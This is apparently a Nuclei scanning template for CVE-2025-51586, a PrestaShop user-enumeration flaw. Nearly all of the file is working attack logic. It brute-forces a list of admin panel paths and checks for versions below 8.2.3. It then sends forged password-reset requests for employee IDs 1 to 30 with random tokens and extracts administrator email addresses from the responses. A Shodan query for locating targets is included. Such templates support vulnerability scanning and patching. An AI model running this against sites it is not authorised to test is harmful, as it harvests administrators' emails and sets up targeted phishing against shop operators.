flow: "// 1) Run panel detection on all common admin paths\nhttp(1);\n\n// 2) Unwrap\
  \ matchedpath (extractors return a list in flow)\nvar path = \"\";\nif (template[\"\
  matchedpath\"] && template[\"matchedpath\"].length) {\n  for (let p of iterate(template[\"\
  matchedpath\"])) {\n    path = p;\n    break; // use first detected admin path\n\
  \  }\n}\n\n// 3) Unwrap version (first extracted value)\nvar v = \"\";\nif (template[\"\
  version\"] && template[\"version\"].length) {\n  for (let ver of iterate(template[\"\
  version\"])) {\n    v = ver;\n    break;\n  }\n}\n\n// 4) JS version check: vulnerable\
  \ if version < 8.2.3\nfunction isVulnerable(ver) {\n  if (!ver) return true;   \
  \        // unknown version -> still test\n  var parts = (ver + \"\").split(\".\"\
  );\n  var M = parseInt(parts[0] || \"0\", 10);\n  var m = parseInt(parts[1] || \"\
  0\", 10);\n  var p = parseInt(parts[2] || \"0\", 10);\n\n  if (M < 8) return true;\n\
  \  if (M > 8) return false;\n  if (m < 2) return true;\n  if (m > 2) return false;\n\
  \  return p < 3;                    // 8.2.0\u20138.2.2 are vuln; 8.2.3+ are not\n\
  }\n\n// 5) Only execute http(2) if we have a path AND the version is vulnerable\n\
  if (path && isVulnerable(v)) {\n  set(\"matchedpath\", path);        // scalar for\
  \ interpolation in http(2)\n  http(2);\n}\n"
http:
- extractors:
  - group: 1
    internal: true
    name: matchedpath
    part: body
    regex:
    - value="https?:\/\/[^\/]+\/((?:[A-Za-z]{2}\/)?(?:[A-Za-z0-9_-]*admin(?:-dev)?|[Bb]ackoffice|adm|panel)[^"]*?)\/
    type: regex
  - group: 1
    internal: true
    name: version
    part: body
    regex:
    - login\.js\?v=([0-9.]+)
    type: regex
  host-redirects: true
  id: detect-panel
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - PrestaShop
    - class="show-forgot-password
  - condition: and
    part: body
    type: word
    words:
    - themes/default/css/admin-theme.css
    - class="show-forgot-password
  matchers-condition: or
  max-redirects: 3
  method: GET
  path:
  - '{{BaseURL}}/{{paths}}/'
  payloads:
    paths:
    - backoffice
    - back-office
    - Backoffice
    - admin-dev
    - backend
    - admin_
    - mikromanage
    - manage
    - manager
    - adminshop
    - administrator
    - administracja
    - adm
    - webadmin
    - admin-web
    - kontrollpanel
    - amministra
    - adminas
    - admin123
    - admin0
    - adminxx
    - admin
    - ps-admin
    - admins
    - p-office
    - admin333
    - admin4444
    - admin66
    - backadmin
    - admin1
    - BackofficeNEW
    - 4dm1n
    - administrazione
    - accesadministrateur
    - _admin123
    - iadmin
    - panel
  stop-at-first-match: true
- extractors:
  - group: 1
    name: reset-email
    part: body
    regex:
    - <input[^>]*name="reset_email"[^>]*value="([^"]+)"
    type: regex
  id: generate-token
  iterate-all: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - AdminLogin
    - PrestaShop
  - status:
    - 200
    type: status
  - part: body
    regex:
    - <input[^>]*name="reset_email"[^>]*value="([^"]+)"
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{Scheme}}://{{Hostname}}/{{matchedpath}}/index.php?controller=AdminLogin&token={{token}}&id_employee={{id}}&reset_token={{token2}}'
  payloads:
    id:
    - '1'
    - '2'
    - '3'
    - '4'
    - '5'
    - '6'
    - '7'
    - '8'
    - '9'
    - '10'
    - '11'
    - '12'
    - '13'
    - '14'
    - '15'
    - '16'
    - '17'
    - '18'
    - '19'
    - '20'
    - '21'
    - '22'
    - '23'
    - '24'
    - '25'
    - '26'
    - '27'
    - '28'
    - '29'
    - '30'
id: CVE-2025-51586
info:
  author: mastercho
  classification:
    cwe-id: CWE-359
  description: 'User enumeration vulnerability in the AdminLogin controller in PrestaShop
    1.7 through 8.2.2 allows remote attackers to obtain administrators user email
    addresses via manipulation of the id_employee and reset_token parameters. An attacker
    who has access to the Back Office login URL can trigger the password reset form
    to disclose the associated email address in a hidden field, even when the provided
    reset token is invalid. This issue has been fixed in 8.2.3.

    '
  impact: 'Attackers with access to the Back Office login URL can enumerate administrator
    email addresses through manipulation of password reset parameters, facilitating
    targeted phishing attacks.

    '
  metadata:
    product: prestashop
    shodan-query: http.component:"prestashop"
    vendor: prestashop
    verified: true
  name: PrestaShop - Information Disclosure
  reference:
  - https://maxime-morel.github.io/advisories/2025/CVE-2025-51586.md
  - https://security.friendsofpresta.org/core/2025/09/04/CVE-2025-51586.html
  - https://nvd.nist.gov/vuln/detail/CVE-2025-51586
  remediation: 'Upgrade PrestaShop to version 8.2.3 or later that properly protects
    email addresses in password reset functionality.

    '
  severity: medium
  tags: cve,cve2025,prestashop,disclosure,token
variables:
  token: '{{rand_base(32)}}'
  token2: '{{rand_base(32)}}'
